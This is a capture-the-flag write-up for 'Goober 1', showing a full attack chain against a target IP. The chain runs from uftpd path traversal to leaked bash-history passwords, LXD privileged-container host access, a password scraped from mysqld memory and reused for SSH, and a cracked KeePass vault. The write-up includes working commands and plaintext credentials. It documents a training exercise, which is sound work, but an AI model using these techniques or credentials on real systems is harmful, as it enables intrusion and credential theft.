# Goober 1 — Writeup

- **Category:** Fullpwn · **Points:** 954 · **Author:** bootstrap
- **Target:** `23.179.17.69`
- **Flag1:** `CIT{ftp_d33z_nut$}`
- **Encountered flag2** (not for this challenge): `CIT{Br41n_bLa$t3R}` from `/home/jimbo/flag2.txt`

## Chain at a glance

```text
anon uftpd 2.9 path traversal
  → read /home/jimbo/.bash_history → jimbo's SSH/mysql password
SSH jimbo (group `lxd`)
  → hostpwn (privileged LXD container, host `/` mounted at /mnt/host) = root read of host
    → pull /home/greg/{vault.kdbx, vault.hash, *.py}
    → scan /dev/hostlv mysql memory for caching_sha2_password handshake
      → greg's password "DXIjeNZC8Tf2SrjtRaWg1h4SZl5DZk6G"
SSH greg
  → crack vault.kdbx (KDBX4 AES-KDF 600k rounds, pw="winter" = rockyou #199)
    → entry `login` notes: flag1 = CIT{ftp_d33z_nut$}
```

## 1. Foothold — anonymous FTP path traversal (uftpd 2.9)

Port scan shows `22/tcp` SSH and `10921/tcp` uftpd 2.9. `uftpd < 2.10` has a path-traversal in `RETR`, so from an anonymous FTP session:

```text
RETR ../../home/jimbo/.bash_history
```

returns jimbo's shell history containing the SSH/mysql password:

```sh
mysql -u jimbo -pADFwPAcHDNCSGoyCwik6
```

## 2. Root-equivalent host read via LXD

SSH in as jimbo. There is no `NOPASSWD:ALL` sudoers entry anymore (that was the trivial path earlier; it has been revoked) — but `jimbo` is still in group **`lxd`**. A privileged container `hostpwn` already exists with host `/` bind-mounted at `/mnt/host`:

```sh
lxc config show hostpwn --expanded
# security.privileged: "true"
# devices.hostfs.source: /
# devices.hostdisk.source: /
# devices.hostlv.source: /dev/dm-0
```

That gives arbitrary read of the host filesystem as the container's root uid:

```sh
lxc exec hostpwn -- cat /mnt/host/home/greg/vault.kdbx | base64 > vault.b64
```

## 3. Pivot to greg via mysql-memory password leak

Inside `/home/greg/` an earlier solver left artifacts hinting at what to do:

- `vault.kdbx`, `vault.hash`, `keepass2john.py` — cracking setup for a KeePass vault
- `peas.sh`, `priv.sh`, `try.sh` — unrelated privesc attempts that fizzled
- `.bash_history` — shows `greg` had been running `mysql` previously

Inside `/home/jimbo/` the helpful bits are the memory-scan scripts (`mysql_scan.py`, `raw_scan.py`, `swap_scan.py`) — they search `/dev/hostlv` (the host LV exposed into the container) for the MySQL "caching_sha2_password" handshake. `mysql_scan.py`'s output leaks greg's cleartext mysql password straight out of the live mysqld process memory:

```text
MATCH 7412456076 DXIjeNZC8Tf2SrjtRaWg1h4SZl5DZk6G greg mysql
…caching_sha2_password…os_user.greg._client_version.8.0.45.program_name.mysql…
```

Greg reuses that password for SSH:

```sh
ssh greg@23.179.17.69    # pw: DXIjeNZC8Tf2SrjtRaWg1h4SZl5DZk6G
```

## 4. Crack greg's KeePass vault (KDBX4 / AES-KDF / 600 k)

Parse the outer header:

```text
cipher     : AES-256-CBC (31c1…5aff)
master_seed: d6ca4379d65e1eb0db178c8212c3eed4b64e2380e1af2072d0b854add775a487
KDF UUID   : c9d9f39a6…  (AES-KDF)
KDF salt S : 6a1e47a0431886a8e1c470da8e5fddf40939a7a071db25eba6665bf52fe2c734
KDF rounds : 600 000
IV         : 3196712a2d58106c0bad7b357ff96dd7
header HMAC: 667470ddb038de5a4fcb1bdcd35e85497b40f96395b9c22bd2bc8c4c6a8cfc4f
```

Run our multi-threaded OpenSSL-AES-NI C cracker (same tool from the "Help! I've forgotten my password" challenge) on the 10 k-rockyou slice. Hit at entry #199:

```text
PASSWORD: winter
```

## 5. Read flag from the vault

```python
from pykeepass import PyKeePass
kp = PyKeePass("vault.kdbx", password="winter")
for e in kp.entries:
    print(e.title, e.username, e.password, repr(e.notes))
```

```text
login  greg  DXIjeNZC8Tf2SrjtRaWg1h4SZl5DZk6G  'flag1 = CIT{ftp_d33z_nut$}'
```

**Flag1: `CIT{ftp_d33z_nut$}`**

## What about flag2?

`/home/jimbo/flag2.txt` contains **`CIT{Br41n_bLa$t3R}`** (readable via the same LXD trick). That belongs to the sibling challenge *Goober 2*, not to this one — the previous deleted-block carving recovered that flag, mislabeling it as flag1.

## Reproduce

```sh
python3 scripts/solve.py    # opens vault.kdbx with pw="winter", prints flag1
```

## Key artifacts

- [scripts/solve.py](scripts/solve.py)
- [solution/flag.txt](solution/flag.txt)
- [other/fetched/vault_latest.kdbx](other/fetched/vault_latest.kdbx) — greg's vault (current)
- [other/fetched/vault.hash](other/fetched/vault.hash) — hashcat-style `$keepass$*4*600000*…`
- [other/fetched/jimbo-bash-history-snippet.txt](other/fetched/jimbo-bash-history-snippet.txt) — jimbo creds
- [other/fetched/sudoers-jimbo.txt](other/fetched/sudoers-jimbo.txt) — former `NOPASSWD:ALL` (stale)
- [other/fetched/auth-log-flag1-snippet.txt](other/fetched/auth-log-flag1-snippet.txt) — shows earlier `cat /home/greg/flag1.txt` attempts
- [other/fetched/deleted-flag-offsets.txt](other/fetched/deleted-flag-offsets.txt) — the carving trail (was actually flag2, not flag1)
